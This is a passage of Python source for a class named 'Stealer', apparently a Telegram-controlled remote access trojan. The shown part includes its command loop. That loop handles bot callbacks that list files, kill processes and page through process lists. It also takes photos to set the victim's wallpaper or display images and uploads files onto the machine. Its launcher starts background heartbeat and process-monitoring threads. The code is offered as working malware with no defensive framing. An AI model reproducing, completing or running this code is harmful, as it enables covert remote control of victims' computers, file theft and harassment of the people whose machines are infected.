                                self.send_telegram_message(self.list_files(path, page=0))
                            except Exception as e:
                                self.send_telegram_message(f"Update error: {e}")

                        elif callback_data.startswith('page_'):
                            page = int(callback_data.replace('page_', ''))
                            self.send_process_buttons(page=page)

                        elif callback_data.startswith('exitgame_'):
                            proc_name = callback_data.replace('exitgame_', '')
                            self.send_telegram_message(self.exit_game(proc_name))

                    # === PHOTOS / FILES ===
                    elif 'message' in update:
                        msg = update['message']

                        if 'photo' in msg and self.waiting_for_photo:
                            file_id = msg['photo'][-1]['file_id']
                            if self.download_photo(file_id):
                                self.send_telegram_message(self.set_wallpaper(self.wallpaper_file))
                            self.waiting_for_photo = False

                        elif 'photo' in msg and self.waiting_for_showimage:
                            file_id = msg['photo'][-1]['file_id']
                            self.send_telegram_message(self.show_image(file_id))
                            self.waiting_for_showimage = False

                        elif 'document' in msg and getattr(self, 'waiting_for_upload', False):
                            file_id = msg['document']['file_id']
                            self.send_telegram_message(self.upload_file(file_id))
                            self.waiting_for_upload = False

                time.sleep(1)
            except Exception as e:
                logging.error(f"Command processing error: {e}")
                time.sleep(5)


# === Launch ===
def main():
    try:
        stealer = Stealer()
        
        # === Automatic background tasks ===
        threading.Thread(target=stealer.heartbeat, daemon=True).start()
        threading.Thread(target=stealer.monitor_processes, daemon=True).start()

        # === Main loop ===
        stealer.handle_telegram_commands()

    except Exception as e:
        logging.critical(f"Critical error: {e}")
        sys.exit(1)
if __name__ == "__main__":
    main()